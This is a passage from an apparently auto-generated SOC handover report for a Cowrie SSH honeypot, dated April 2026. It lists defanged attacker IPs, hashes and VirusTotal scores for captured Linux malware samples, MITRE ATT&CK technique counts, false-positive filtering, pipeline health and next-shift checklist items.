| `14.103.117[.]98` | 1 | 2026-04-10 14:38 | 2026-04-10 14:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.45[.]20` | 1 | 2026-04-10 13:50 | 2026-04-10 13:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.110.149[.]157` | 1 | 2026-04-10 13:05 | 2026-04-10 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.170[.]111` | 1 | 2026-04-10 13:37 | 2026-04-10 13:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.231.20[.]121` | 1 | 2026-04-10 13:42 | 2026-04-10 13:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `23.91.97[.]250` | 1 | 2026-04-10 13:36 | 2026-04-10 13:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.128.171[.]39` | 1 | 2026-04-10 13:51 | 2026-04-10 13:53 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.228.6[.]161` | CN | eleven street,No. 18 Institute of Jingdong headquarters | **100** ⚠️ | 5 |
| `103.91.246[.]101` | IN | YOTTA NETWORK SERVICES PRIVATE LIMITED | **100** ⚠️ | 50 |
| `180.76.143[.]203` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 6 |
| `180.110.149[.]157` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 32 |
| `179.57.170[.]71` | CL | Telefonica del Sur S.A. | **100** ⚠️ | 50 |
| `23.91.97[.]250` | HK | UCLOUD | **100** ⚠️ | 19 |
| `211.219.22[.]213` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `14.103.45[.]20` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.76.170[.]111` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `185.239.84[.]249` | HK | Sakura network limited | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 196 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 86 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 59 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 224 cases |
| Tool 34  | Credential Extractor        | ✅ 145 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 59 priority case(s) shown individually · 16 recon entry/entries in table (9 group(s) consolidating 155 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-10T14:46:08Z_
